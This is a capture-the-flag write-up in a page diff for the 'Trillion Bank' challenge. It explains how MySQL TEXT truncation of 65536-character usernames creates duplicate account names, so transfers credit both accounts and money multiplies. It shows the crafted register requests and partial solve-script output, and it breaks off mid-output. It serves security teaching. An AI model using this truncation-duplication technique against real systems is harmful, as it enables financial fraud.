@@ -1,0 +1,496 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
+	<link href='/global.css' rel='stylesheet'>
+	<title>Trillion Bank</title>
+  </head>
+  <body class="bg-[url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=')] flex flex-col place-items-center min-h-dvh">
+	<div class="bg-(--color-background-one) box-border my-20 border-1 border-(--color-primarygreen) flex flex-col px-5 pb-5 overflow-x-auto font-jetbrains text-lg max-w-95/100">
+		<div class="text-custom-dynamic text-(--color-plaintext)">
+			<h1>The Ark Challenge - Trillion Bank</h1>
+<p>We're given the following files.</p>
+<pre class="language-bash"><code class="language-bash">├── compose.yaml
+└── web
+    ├── Dockerfile
+    ├── db.js
+    ├── index.html
+    ├── index.js
+    ├── package-lock.json
+    └── package.json
+
+<span class="token number">2</span> directories, <span class="token number">7</span> files</code></pre>
+<p>When we visit the application, we can register an account and are greeted with the following UI.</p>
+<img class="m-auto border-1 border-(--color-grey-border) sm:w-200" src="/images/Screenshot 2025-11-29 194508.png">
+<p>From this UI alone, we can understand that the primary functionality involves transfering money between users. It's likely that our goal will be to obtain more money than we initially have.</p>
+<p>Looking into <code>index.js</code>, we can see that only four routes exist.</p>
+<pre class="language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/register"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token operator">...</span>snip<span class="token operator">...</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/me"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">onRequest</span><span class="token operator">:</span> auth <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token operator">...</span>snip<span class="token operator">...</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/transfer"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">onRequest</span><span class="token operator">:</span> auth <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token operator">...</span>snip<span class="token operator">...</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token operator">...</span>snip<span class="token operator">...</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Since the application is quite small, we'll break down each of these routes and make some observations (we'll exclude <code>/</code>, since it just serves static HTML).</p>
+<h2>/api/register</h2>
+<p>This route allows users to be registered.</p>
+<pre class="language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/register"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[a-z0-9]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Invalid name"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>names<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 1</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Already exists"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  names<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>
+
+  <span class="token keyword">const</span> <span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO users SET ?"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+    name<span class="token punctuation">,</span>
+    <span class="token literal-property property">balance</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
+  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
+  res
+    <span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> <span class="token keyword">await</span> res<span class="token punctuation">.</span><span class="token function">jwtSign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> result<span class="token punctuation">.</span>insertId <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Succeeded"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>I've added a comment to each of the three most notable lines in the snippet. For each line, the we can make the following observations:</p>
+<ol>
+<li><code>names.has(name)</code> ensures users aren't able to register with the same username. Note that <code>names</code> is a Javascript <code>Set</code>, meaning it only stores unique values.</li>
+<li><code>names.add(name)</code> adds the requested username to the <code>names</code> set if it didn't exist before.</li>
+<li>The registered user is added to the MySQL database. It stores the users <code>id</code>, <code>name</code>, and <code>balance</code>. We start with a <code>balance</code> of <code>10</code>.</li>
+</ol>
+<h2>/api/me</h2>
+<p>This route returns details about the current logged in user.</p>
+<pre class="language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/me"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">onRequest</span><span class="token operator">:</span> auth <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">try</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token number">0</span><span class="token operator">:</span> <span class="token punctuation">{</span> balance <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE id = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>balance <span class="token operator">=</span> balance<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>balance <span class="token operator">>=</span> <span class="token constant">TRILLION</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span> <span class="token comment">// 💰</span>
+  <span class="token punctuation">}</span>
+  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>As shown, the route simply searches for a user based on the <code>id</code> claim of a JWT, and then returns the details of that user. The important thing to note is the condition that checks whether the users balance is greater than one trillion (the <code>TRILLION</code> global variable is set to <code>1_000_000_000_000</code>). If this condition is true, then this route will return the flag. This confirms that our goal is to obtain a lot of money.</p>
+<h2>/api/transfer</h2>
+<p>This route handles money transfers.</p>
+<pre class="language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/transfer"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">onRequest</span><span class="token operator">:</span> auth <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> recipientName <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>recipientName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>names<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>recipientName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Not found"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">const</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token number">0</span><span class="token operator">:</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE name = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>recipientName<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">===</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 1</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Self-transfer is not allowed"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">const</span> amount <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isFinite</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span> <span class="token operator">||</span> amount <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Invalid amount"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">const</span> conn <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">try</span> <span class="token punctuation">{</span>
+    <span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">beginTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">const</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token number">0</span><span class="token operator">:</span> <span class="token punctuation">{</span> balance <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE id = ? FOR UPDATE"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
+      req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>id<span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>amount <span class="token operator">></span> balance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid amount"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"UPDATE users SET balance = balance - ? WHERE id = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
+      amount<span class="token punctuation">,</span>
+      req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>id<span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
+    <span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"UPDATE users SET balance = balance + ? WHERE name = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
+      amount<span class="token punctuation">,</span>
+      recipientName<span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span>
+
+    <span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">rollback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
+    db<span class="token punctuation">.</span><span class="token function">releaseConnection</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Succeeded"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Again, I've added comments to the code that highlight specific lines. Looking at these lines, we can see that:</p>
+<ol>
+<li>The application prevents self-transfers by querying the database for users with the name of the intended recipient (<code>recipientName</code>). It then compares the <code>id</code> of the queried user with the <code>id</code> JWT claim (<code>req.user.id</code>).</li>
+<li>The <code>balance</code> of the current user is retrieved by querying the database for users with the same <code>id</code> as <code>req.user.id</code>. This is then used to make sure that the user isn't requesting to send more than they have.</li>
+<li>The <code>balance</code> of the current user is updated to remove the amount that they are sending (this database query uses <code>req.user.id</code> again to find the current user).</li>
+<li>The <code>balance</code> of the recipient is updated to add the amount that was sent. Note that the database query used to find the recipient returns all users where <code>name = recipientName</code>.</li>
+</ol>
+<h2>Thoughts and Ideas</h2>
+<p>I won't go into to much detail of all the ideas I had, but I did consider the following:</p>
+<ul>
+<li>The application uses the <code>mysql2</code> library for database queries, which can often be exploited when data types aren't properly validated. See <a href="https://github.com/sidorares/node-mysql2/issues/1914">https://github.com/sidorares/node-mysql2/issues/1914</a>. However, the application does a good job of validating input types - often casting them to <code>String</code> before they're processed.</li>
+<li>The room for useful race conditions seems slim to none. The application uses a transaction (through <code>beginTransaction()</code>) for SQL queries relating to transfers.</li>
+<li>The amount of money we can specify is well validated, so it's unlikely that our way forward is related to weird Javascript math.</li>
+</ul>
+<p>Finally, after running into dead ends with those ideas - I considered what state would be useful for us in achieving our goal (getting more money). Obviously having more money would be nice, but if we had that then we'd have already solved the challenge. Another state that I considered was a situation where we were able to register two users with the same username. What would happen if we achieved this?</p>
+<h2>Theory Crafting</h2>
+<p>Consider we had two users with the same <code>name</code> that existed in the database as:</p>
+<pre class="language-md"><code class="language-md"><span class="token title important">| id | name | balance |
+<span class="token punctuation">-----------------------</span></span>
+| 1  | user | 10      |
+| 2  | user | 10      |</code></pre>
+<p>What would happen if the user with <code>id</code> 2 made a transfer to the user with <code>id</code> 1? The following lines pulled from the <code>/api/transfer</code> source code tell us what would happen.</p>
+<p>The check for self-transfer would pass, because the check is based on <code>id</code>.</p>
+<pre class="language-javascript"><code class="language-javascript"> <span class="token keyword">const</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token number">0</span><span class="token operator">:</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE name = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>recipientName<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">===</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Self-transfer is not allowed"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span></code></pre>
+<p>The amount that is transferred would be removed from the user with <code>id</code> 2 (because they are making the transfer and the update is based on <code>id</code>).</p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"UPDATE users SET balance = balance - ? WHERE id = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
+  amount<span class="token punctuation">,</span>
+  req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>id<span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Now something strange happens when the application transfers the money to the other account, read the snippet below.</p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"UPDATE users SET balance = balance + ? WHERE name = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
+  amount<span class="token punctuation">,</span>
+  recipientName<span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>See how the balance update is based on the <code>name</code>? Instead of only updating the balance of one account, it updates the balance of both accounts! This means the money that was removed from user 2 is now added back, and user 1 still recieves the money. This seems like it would definitely lead to us being able to generate a lot of money, but how do we get two users with the same <code>name</code>?</p>
+<h2>Finding the vulnerability</h2>
+<p>I thought at first that it might be possible to win a race condition during registration, in the following code.</p>
+<pre class="language-javascript"><code class="language-javascript">  <span class="token keyword">if</span> <span class="token punctuation">(</span>names<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Already exists"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  names<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">const</span> <span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO users SET ?"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+    name<span class="token punctuation">,</span>
+    <span class="token literal-property property">balance</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
+  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>However, having two requests pass the <code>names.has(name)</code> check before hitting the <code>names.add(name)</code> appears to be very difficult, which makes sense. I tried a few things like registering thousands of users to slow down the <code>.add / .has</code> calls, but none worked. After giving up on that idea, I had the thought to check what the max length of strings was in MySQL. If there was a feasible max length, then I'd want to check what the behaviour was at that boundary, e.g. if MySQL would truncate a username that was submitted.</p>
+<p>Looking at <code>db.js</code>, we can see the SQL query used to set up the users table.</p>
+<pre class="language-SQL"><code class="language-SQL">CREATE TABLE users (
+  id INT AUTO_INCREMENT NOT NULL,
+  name TEXT NOT NULL,
+  balance BIGINT NOT NULL,
+  PRIMARY KEY (id)
+)</code></pre>
+<p>Doing a quick check of the MySQL documentation we can find that the max length of a <code>TEXT</code> column (which is used for <code>name</code>) is <code>65535</code>. To test our idea, we can register a user with a name containing <code>65535</code> <code>a</code>'s, and then a user with a name containing <code>65536</code> <code>a</code>s.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/api/register</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span>
+...snip...
+{"name": "&lt; 65535 a's>"}</code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+<span class="token header"><span class="token header-name keyword">set-cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzY0NDA1MjAyfQ.13ia33Af85-CKeeJscK14kAuT6oXWjbg61poYBLWuNE; SameSite=Lax</span></span>
+...snip...
+{"msg":"Succeeded"}</code></pre>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/api/register</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span>
+...snip...
+{"name": "&lt; 65536 a's>"}</code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+<span class="token header"><span class="token header-name keyword">set-cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNzY0NDA1MjAzfQ.lz7gcE_Qp89HXyodXqfamVv9oPPs510yWm3RvJGvhM8; SameSite=Lax</span></span>
+...snip...
+{"msg":"Succeeded"}</code></pre>
+<p>Checking the database after registration shows the following in the <code>users</code> table.</p>
+<pre class="language-md"><code class="language-md"><span class="token title important">| id | name         | balance |
+<span class="token punctuation">-----------------------</span></span>
+| 1  | &lt; 65535 a's> | 10      |
+| 2  | &lt; 65535 a's> | 10      |</code></pre>
+<p>We did it! Two users now exist with the same <code>name</code>. From here, we can pass money back and forth between the accounts to generate more and more money. I wrote a script to automate this process, and also made it use three accounts instead of two just to make things faster. The following excerpt shows the output of this script.</p>
+<pre class="language-bash"><code class="language-bash">└─$ python3 solve.py http://localhost:3000/       
+Registered an account with: <span class="token number">65535</span> a<span class="token string">'s
+Registered an account with: 65536 a'</span>s
+Registered an account with: <span class="token number">65537</span> a<span class="token string">'s
+==================================
+Account 1 --- 10 --> Accounts 0, 1, and 2
+Account 0 - {'</span><span class="token function">id</span><span class="token string">': 1, '</span>balance<span class="token string">': 20, '</span>flag<span class="token string">': None}
